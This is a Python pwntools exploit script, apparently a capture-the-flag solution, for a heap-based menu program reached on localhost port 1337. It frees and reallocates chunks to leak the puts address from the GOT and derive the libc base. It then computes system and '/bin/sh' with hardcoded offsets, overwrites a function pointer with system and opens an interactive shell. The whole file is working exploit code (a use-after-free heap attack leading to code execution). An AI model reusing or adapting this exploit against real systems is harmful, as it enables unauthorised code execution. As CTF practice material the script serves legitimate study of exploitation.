from pwn import *

#p = process("./data/chall")
p = remote("localhost",1337)
elf = ELF("./a.out")
libc = ELF("/usr/lib/libc.so.6")
context.terminal = ["konsole", "-e"]
context.arch = "amd64"
# gdb.attach(p)
# input()

def create(malloc,value,ID):
    p.recvuntil(b"Make your choice:")
    p.sendline(b"1")
    p.recvuntil(b"weapons array: ")
    p.sendline(malloc)
    p.recvuntil(b"Stuff your hero:  ")
    p.sendline(value)
    p.recvuntil(b"ID: ")
    p.sendline(ID)

def delete(ID):
    p.recvuntil(b"Make your choice: ")
    p.sendline(b"2")
    p.recvuntil(b"Enter hero index (0-7):")
    p.sendline(ID)

def view(ID):
    p.recvuntil(b"Make your choice: ")
    p.sendline(b"3")
    p.recvuntil(b"Enter hero index (0-7):")
    p.sendline(ID)


create(b"72",b"AAAA",b"0")
create(b"72",b"BBBB",b"1")
create(b"72",b"CCCC",b"2")

"""
t0 = malloc(0x48)
w0 = malloc(0x48)
t1 = malloc(0x48)
w1 = malloc(0x48)
t2 = malloc(0x48)
w2 = malloc(0x48)
t3 = malloc(0x48)
w3 = malloc(0x48)
"""

delete(b"0")
delete(b"1")

"""
free list :
@t0
@t1
"""

payload = p64(elf.got['puts'])+cyclic(72-8)
create(b"72",payload,b"0")



"""
t0 = @t1
w0 = @t0
@t0 = "E"*72 ?
"""

view(b"0")



print(p.recvuntil(b"Hero stuff:\n"))
leak = p.recv(6)
leak = int.from_bytes(leak,"little")
log.success("puts: {}".format(hex(leak)))

base = leak - libc.symbols['puts']
log.success("libc base: {}".format(hex(base)))
system = base + 0x4dc30
binsh = base + 0x199e28
log.success("libc system: {}".format(hex(system)))
log.success("libc binsh: {}".format(hex(binsh)))

create(b"72",b"AAAA",b"1")
create(b"72",b"BBBB",b"2")
create(b"72",b"CCCC",b"3")

delete(b"1")
delete(b"2")

print(p.recvuntil(b"Make your choice: "))
p.sendline(b"1")
print(p.recvuntil(b"weapons array: "))

p.sendline(b"72")
print(p.recvuntil(b"Stuff your hero:  "))
p.sendline(b"/bin/sh;"+b"A"*48+p64(system)+b"A"*15)
print(p.recvuntil(b"Make your choice: "))

p.interactive()

